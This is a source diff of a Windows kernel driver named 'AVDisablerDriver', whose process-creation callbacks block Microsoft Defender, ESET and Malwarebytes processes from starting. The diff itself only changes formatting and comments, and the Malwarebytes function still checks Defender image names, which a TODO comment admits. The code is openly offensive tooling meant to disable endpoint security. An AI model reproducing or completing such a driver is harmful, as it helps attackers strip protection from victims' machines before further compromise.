@@ -71,11 +71,8 @@ void PreventDefenderProcessCreate(PEPROCESS Process,
 	}
 }
 
-void PreventEsetProcessCreate(PEPROCESS Process,
-								  HANDLE ProcessId,
-								  PPS_CREATE_NOTIFY_INFO CreateInfo)
+void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
 {
-
 	NTSTATUS status = STATUS_SUCCESS;
 	HANDLE hProcess = nullptr;
 
@@ -125,9 +122,9 @@ void PreventMalwareBytesProcessCreate(PEPROCESS Process,
 	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
 	KdPrint(("[+]AVDisablerDriver::PreventMalwareBytesProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObGetObjectByPointer));
 
-	// checking if the process being created is one of ESET's processes
+	// checking if the process being created is one of Malwarebyte's processes
 	// 
-	// ---------- !!!!!need to modify the processes' variables to ESET images names!!!!! ----------
+	// ---------- !!!!!need to modify the processes' variables to Malwarebytes images names!!!!! ----------
 	if (RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
 		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
 		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
@@ -291,10 +288,8 @@ VOID UnloadRoutine(PDRIVER_OBJECT DriverObject)
 		KdPrint(("[-] AVDisablerDriver[Unload Routine]: couldn't delete symlink %wZ (NTSTATUS: 0x%x)\n", &DeviceSymlink, status));
 		return;
 	}
-	KdPrint(("[+] AVDisablerDriver[Unload Routine]: unload routine executed successfully!\n"));
-
-
 	
+	KdPrint(("[+] AVDisablerDriver[Unload Routine]: unload routine executed successfully!\n"));	
 }
 
 extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
